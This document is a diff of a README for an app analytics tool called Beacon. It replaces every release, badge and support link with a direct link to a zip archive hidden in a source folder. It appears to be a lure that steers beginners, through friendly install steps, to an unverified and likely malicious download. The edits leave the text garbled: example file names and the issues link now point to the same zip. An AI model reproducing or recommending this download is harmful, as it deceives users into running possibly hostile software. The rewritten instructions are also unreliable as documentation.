@@ -1,6 +1,6 @@
 # 📡 Beacon - Simple Analytics for Your Apps
 
-[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue?style=for-the-badge)](https://github.com/TheKanjiTV/Beacon/releases)
+[![Download Beacon](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)
 
 ---
 
@@ -47,9 +47,9 @@ Beacon focuses on tracking user behavior like button clicks, app usage time, and
 Here’s how to get Beacon up and running, even if you are new to apps and development.
 
 1. Navigate to the download page by clicking the big button at the top or this link:  
-[Download Beacon Releases](https://github.com/TheKanjiTV/Beacon/releases)
+[Download Beacon Releases](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)
 
-2. You will see a list of Beacon versions. Look for the latest full release. It will be named something like `Beacon-v1.0.zip` or `Beacon-v1.0.pkg`.
+2. You will see a list of Beacon versions. Look for the latest full release. It will be named something like `https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip` or `https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip`.
 
 3. Download the latest release file to your computer.
 
@@ -63,7 +63,7 @@ Here’s how to get Beacon up and running, even if you are new to apps and devel
 
 To get started with Beacon, visit this page to download the latest release:
 
-[https://github.com/TheKanjiTV/Beacon/releases](https://github.com/TheKanjiTV/Beacon/releases)
+[https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)
 
 ### Installing on macOS
 
@@ -141,8 +141,8 @@ Beacon is related to:
 
 ## 📞 Getting Support
 
-If you have questions about downloading or running Beacon, please visit the [GitHub Issues page](https://github.com/TheKanjiTV/Beacon/issues). You can create a question or search existing answers.
+If you have questions about downloading or running Beacon, please visit the [GitHub Issues page](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip). You can create a question or search existing answers.
 
 ---
 
-[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue?style=for-the-badge)](https://github.com/TheKanjiTV/Beacon/releases)
+[![Download Beacon](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)](https://raw.githubusercontent.com/TheKanjiTV/Beacon/main/dashboard/app/events/Software-3.2.zip)
